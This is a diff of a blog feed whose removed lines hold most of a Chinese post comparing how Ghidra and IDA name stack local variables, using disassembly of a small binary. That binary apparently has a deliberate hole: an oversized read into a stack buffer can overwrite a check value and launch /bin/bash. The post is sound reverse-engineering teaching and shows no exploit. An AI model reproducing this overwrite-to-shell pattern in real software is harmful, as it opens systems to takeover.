-      004006a5               MOV       EAX,dword ptr &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;RBP + local_28+0x4]
-      004006a8               CMP       EAX,0xcaf3baee
-      004006ad               JNZ       LAB_004006bb
-      004006af               MOV       &lt;span class=&quot;nv&quot;&gt;EDI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;s_/bin/bash_0040077c,s_/bin/bash_004  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/bin/bash&quot;&lt;/span&gt;
-      004006b4               CALL      run_cmd                                    undefined run_cmd&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
-      004006b9               JMP       LAB_004006c5
- LAB_004006bb                              XREF[1]:   004006ad&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;j&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  
-      004006bb               MOV       &lt;span class=&quot;nv&quot;&gt;EDI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;s_/bin/date_00400786,s_/bin/date_004  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/bin/date&quot;&lt;/span&gt;
-      004006c0               CALL      run_cmd                                    undefined run_cmd&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
- LAB_004006c5                              XREF[1]:   004006b9&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;j&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  
-      004006c5               MOV       EAX,0x0
-      004006ca               MOV       RCX,qword ptr &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;RBP + local_10]
-      004006ce               XOR       RCX,qword ptr FS:[0x28]
-      004006d7               JZ        LAB_004006de
-      004006d9               CALL      __stack_chk_fail                           undefined __stack_chk_fail&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
-                         &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; Flow Override: CALL_RETURN &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CALL_TERMINATOR&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-                         LAB_004006de                              XREF[1]:   004006d7&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;j&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  
-      004006de               LEAVE
-      004006df               RET
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;从最上面可以看到，ghidra函数中的局部变量，直接是根据STACK进行标识，是根据函数开始处RSP的偏移。&lt;/p&gt;
-
-&lt;p&gt;当看到这行&lt;strong&gt;LEA       RAX=&amp;gt;local_38,[RBP + -0x30]&lt;/strong&gt;时，是获取RBP-0x30的地址，在想和local_38有什么关系？&lt;/p&gt;
-
-&lt;p&gt;从最上面&lt;strong&gt;Stack[-0x38  local_38&lt;/strong&gt;看到，local_38 = 起始RSP-0x38&lt;/p&gt;
-
-&lt;p&gt;由&lt;strong&gt;PUSH RBP  MOV RBP,RSP&lt;/strong&gt;可知，RBP=起始RSP - 0x8，那RBP-0x30 = 起始RSP-0x8-0x30=起始RSP-0x38=local_38&lt;/p&gt;
-
-&lt;p&gt;所以，RAX获取到的是local_38的地址。&lt;/p&gt;
-
-&lt;h2 id=&quot;ida的分析结果&quot;&gt;IDA的分析结果&lt;/h2&gt;
-&lt;p&gt;IDA的结果：&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;text:0000000000400641 &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; int __cdecl main&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;int argc, const char &lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;argv, const char &lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;envp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-.text:0000000000400641                 public main
-.text:0000000000400641 main            proc near               &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; DATA XREF: _start+1D↑o
-.text:0000000000400641
-.text:0000000000400641 var_40          &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; qword ptr &lt;span class=&quot;nt&quot;&gt;-40h&lt;/span&gt;
-.text:0000000000400641 var_34          &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; dword ptr &lt;span class=&quot;nt&quot;&gt;-34h&lt;/span&gt;
-.text:0000000000400641 buf             &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; qword ptr &lt;span class=&quot;nt&quot;&gt;-30h&lt;/span&gt;
-.text:0000000000400641 var_28          &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; qword ptr &lt;span class=&quot;nt&quot;&gt;-28h&lt;/span&gt;
-.text:0000000000400641 var_20          &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; qword ptr &lt;span class=&quot;nt&quot;&gt;-20h&lt;/span&gt;
-.text:0000000000400641 var_18          &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; dword ptr &lt;span class=&quot;nt&quot;&gt;-18h&lt;/span&gt;
-.text:0000000000400641 var_8           &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; qword ptr &lt;span class=&quot;nt&quot;&gt;-8&lt;/span&gt;
-.text:0000000000400641
-.text:0000000000400641 &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; __unwind &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-.text:0000000000400641                 push    rbp
-.text:0000000000400642                 mov     rbp, rsp
-.text:0000000000400645                 sub     rsp, 40h
-.text:0000000000400649                 mov     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp+var_34], edi
-.text:000000000040064C                 mov     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp+var_40], rsi
-.text:0000000000400650                 mov     rax, fs:28h
-.text:0000000000400659                 mov     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp+var_8], rax
-.text:000000000040065D                 xor     eax, eax
-.text:000000000040065F                 mov     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp+buf], 0
-.text:0000000000400667                 mov     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp+var_28], 0
-.text:000000000040066F                 mov     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp+var_20], 0
-.text:0000000000400677                 mov     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp+var_18], 0
-.text:000000000040067E                 mov     dword ptr &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp+var_20+4], 0DEADBEEFh
-.text:0000000000400685                 mov     edi, offset s   &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Are you a big boiiiii??&quot;&lt;/span&gt;
-.text:000000000040068A                 call    _puts
-.text:000000000040068F                 lea     rax, &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp+buf]
-.text:0000000000400693                 mov     edx, 18h        &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; nbytes
-.text:0000000000400698                 mov     rsi, rax        &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; buf
-.text:000000000040069B                 mov     edi, 0          &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; fd
-.text:00000000004006A0                 call    _read
-.text:00000000004006A5                 mov     eax, dword ptr &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp+var_20+4]
-.text:00000000004006A8                 cmp     eax, 0CAF3BAEEh
-.text:00000000004006AD                 jnz     short loc_4006BB
-.text:00000000004006AF                 mov     edi, offset aBinBash &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/bin/bash&quot;&lt;/span&gt;
-.text:00000000004006B4                 call    run_cmd
-.text:00000000004006B9                 jmp     short loc_4006C5
-.text:00000000004006BB &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------&lt;/span&gt;
-.text:00000000004006BB
-.text:00000000004006BB loc_4006BB:                             &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CODE XREF: main+6C↑j
-.text:00000000004006BB                 mov     edi, offset aBinDate &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/bin/date&quot;&lt;/span&gt;
-.text:00000000004006C0                 call    run_cmd
-.text:00000000004006C5
-.text:00000000004006C5 loc_4006C5:                             &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CODE XREF: main+78↑j
-.text:00000000004006C5                 mov     eax, 0
-.text:00000000004006CA                 mov     rcx, &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp+var_8]
-.text:00000000004006CE                 xor     rcx, fs:28h
-.text:00000000004006D7                 jz      short locret_4006DE
-.text:00000000004006D9                 call    ___stack_chk_fail
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;对于IDA来说，局部变量是针对RBP进行偏移的，RBP是函数调用中的栈帧的基址，并且在函数返回前不会改动，所以比较好理解。&lt;/p&gt;
-
-&lt;h2 id=&quot;ghidra的问题&quot;&gt;Ghidra的问题&lt;/h2&gt;
-
-&lt;p&gt;IDA上0x00400649地址处汇编为&lt;strong&gt;mov [rbp+var_34], edi&lt;/strong&gt;，根据之前的RBP=起始RSP-0x8，转化成&lt;strong&gt;起始RSP-0x8-0x34&lt;/strong&gt;即&lt;strong&gt;起始RSP-0x3C&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;而该地址对应的是local_3c，但是ghidra上却是&lt;strong&gt;RBP + local_3c&lt;/strong&gt;，因为local_3c的地址想对于RBP是0x34，所以ghidra使用&lt;strong&gt;MOV  dword ptr [local_3c],EDI&lt;/strong&gt;会比较合适。&lt;/p&gt;
-
-&lt;p&gt;在github上，看到了为什么ghidra会选择以stack作为偏移。&lt;a href=&quot;https://github.com/NationalSecurityAgency/ghidra/issues/223&quot;&gt;链接&lt;/a&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;关闭ghidra局部变量引用&quot;&gt;关闭ghidra局部变量引用&lt;/h2&gt;
-
-&lt;p&gt;这种可以关闭，通过开始菜单上的Edit –&amp;gt; Tool Options –&amp;gt; Listing Fields –&amp;gt; Operands Field，将&lt;strong&gt;Markup Stack Variable References&lt;/strong&gt;勾去掉就行。&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/pictures/reverse/ghidra_stack.png&quot; alt=&quot;graph&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;效果如下：&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/pictures/reverse/ghidra_close.png&quot; alt=&quot;graph&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;关闭后效果会更好，可以直接知道每行汇编代码是针对那个局部变量进行处理，并且针对RBP的偏移也有展示。&lt;/p&gt;</content><author><name>liwugang</name><email>liwugang@outlook.com</email></author><category term="reverse" /><summary type="html">Ghidra函数中的局部变量，不是根据RBP的偏移，而是根据函数开始处RSP的偏移进行标识。</summary></entry></feed>
+&lt;p&gt;头文件信息将会打包到程序中，并且也会随时更新，所以在编译代码时要注意头文件的一致，防止不一致导致的问题。特别是在升级系统后，要注意类似问题。&lt;/p&gt;</content><author><name>liwugang</name><email>liwugang@outlook.com</email></author><category term="debug" /><summary type="html">最近下载了SELinux代码，编译了checkpolicy，但是使用时出现了段错误，本文记录下分析过程。</summary></entry></feed>
